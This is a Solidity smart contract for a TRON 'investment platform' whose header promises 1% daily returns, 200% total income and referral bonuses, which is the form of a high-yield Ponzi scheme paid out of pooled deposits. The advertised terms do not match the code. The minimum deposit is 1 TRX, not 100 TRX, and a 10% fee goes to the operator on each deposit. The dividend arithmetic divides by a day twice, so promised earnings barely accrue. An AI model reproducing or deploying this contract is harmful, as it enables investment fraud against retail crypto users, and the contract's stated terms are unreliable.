//SourceUnit: tron-capital.sol

/*
 *   The investment platform, which was developed by the TRON Capital, opens up opportunities
 *   for passive earnings from investments with a growing percentage depending on the basic 
 *   income and personal hold bonus.
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐  
 *   │   Website: https://troncapital.net/                                   │
 *   │                                                                       │  
 *   │   Telegram Public Group: https://t.me/TRONCapitalNet                  |
 *   │   Telegram Support:      https://t.me/TRONCapitalSupport              |
 *   │   Telegram Advertising:  https://t.me/TRONCapitalAdvertising          |
 *   |                                                                       |
 *   |   E-mail:                info@troncapital.net                         |
 *   |   Support:               support@troncapital.net                      |
 *   |   Advertising:           media@troncapital.net                        |
 *   └───────────────────────────────────────────────────────────────────────┘ 
 *
 *   [USAGE INSTRUCTION]
 *
 *   - Connect to your wallet using the TronLink / TronMask browser extension or TronWallet mobile application.
 *   - Make an investment in TRON (TRX) cryptocurrency to the smart contract and start making profit.
 *   - Track the accrual of profit on investments, percents and referral bonuses in real time.
 *   - Make a withdraw at any time. All your accruals and referral bonuses will be paid out immediately.
 *
 *   [INVESTMENT CONDITIONS]
 * 
 *   - Basic interest rate: +1% every 24 hours (+0.0416% hourly)
 *   - Personal hold-bonus: +0.1% for every 24 hours without withdraw 
 * 
 *   - Minimal deposit: 100 TRX
 *   - There is no maximum limit
 *   - Total income: 200% (deposit included)
 *   - Earnings every second
 *   - Withdraw at any time
 * 
 *   [REFERRAL BONUSES]
 *
 *   - 10% of the contribution of each attracted investor to the project.
 *
 *   [BALANCE BREAKDOWN]
 *
 *   - 90% Investor savings pay-outs
 *   - 7%  SMM marketing costs
 *   - 3%  Administrative costs
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *   [LEGAL COMPANY INFORMATION]
 *
 *   - Officially registered company name: TRON Capital Ltd (#12974848)
 *   - Company status: https://beta.companieshouse.gov.uk/company/12974848
 *   - Certificate of incorporation: https://troncapital.net/en/assets/img/certificate.jpg
 *
 *   [SMART-CONTRACT AUDITION AND SAFETY]
 *
 *   - Audited by independent company GROX Solutions (https://grox.solutions)
 *   - Audition certificate: https://troncapital.net/en/assets/smart-contract-audit.pdf
 */

pragma solidity 0.5.10;

contract TRONCapital {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 1 trx;
	uint256 constant public BASE_PERCENT = 10;
	uint256 constant public REFERRER_PERCENT = 100;
	uint256 constant public PROJECT_FEE_PERECENT = 100;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalDeposits;

	address payable public projectAddress;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 bonus;
        uint256 bonusWithdrawn;
	}

	mapping (address => User) internal users;

	event NewUser(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event ReffererBonusIncreased(address indexed referrer, address indexed referral, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable projectAddr) public {
		require(!isContract(projectAddr));
		projectAddress = projectAddr;
	}

	function invest(address referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);

        // Get current user
		User storage user = users[msg.sender];

        // Create new user
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit NewUser(msg.sender);
		}

        // Add user deposit
		user.deposits.push(Deposit(msg.value, 0, block.timestamp));

        // Update statistics
		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		emit NewDeposit(msg.sender, msg.value);

        // Pay project fee
        uint256 fee = msg.value.mul(PROJECT_FEE_PERECENT).div(PERCENTS_DIVIDER);
		projectAddress.transfer(fee);
		emit FeePayed(msg.sender, fee);

        // Add referrer bonus
		if (referrer != address(0) && referrer != msg.sender && users[referrer].deposits.length > 0) {
            uint256 amount = msg.value.mul(REFERRER_PERCENT).div(PERCENTS_DIVIDER);
            users[referrer].bonus = users[referrer].bonus.add(amount);
            emit ReffererBonusIncreased(referrer, msg.sender, amount);
		}
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 userPercentRate = getUserPercentRate(msg.sender);

		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {

				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(secondsAgo(user.deposits[i].start))
						.div(TIME_STEP);

				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(secondsAgo(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
					dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
				}

				totalAmount = totalAmount.add(dividends);
				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); // update storage data
			}
		}

		uint256 bonusAvailable = user.bonus.sub(user.bonusWithdrawn);

		if (bonusAvailable > 0) {
			totalAmount = totalAmount.add(bonusAvailable);
            user.bonusWithdrawn = user.bonusWithdrawn.add(bonusAvailable);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;

		msg.sender.transfer(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getUserPercentRate(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		if (isActive(userAddress)) {
			uint256 timeMultiplier = secondsAgo(user.checkpoint).div(TIME_STEP);

			return BASE_PERCENT.add(timeMultiplier);
		} else {
			return BASE_PERCENT;
		}
	}

	function secondsAgo(uint256 timestamp) public view returns (uint256) {
		if (timestamp > 1000000000) {
			return block.timestamp.sub(timestamp).div(TIME_STEP);
		}

		return 0;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate = getUserPercentRate(userAddress);

		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {

				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(secondsAgo(user.deposits[i].start))
						.div(TIME_STEP);

				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(secondsAgo(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
					dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);
				// no update here, because that is view function
			}

		}

		return totalDividends;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserLastDepositTime(address userAddress) public view returns(uint256) {
        if (users[userAddress].deposits.length > 0) {
            return users[userAddress].deposits[users[userAddress].deposits.length - 1].start;
        }

        return 0;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralBonusWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].bonusWithdrawn;
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).sub(getUserReferralBonusWithdrawn(userAddress)).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(2)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

        amount = amount.add(user.bonusWithdrawn);

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
		require(c <= a, "SafeMath: subtraction overflow");

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}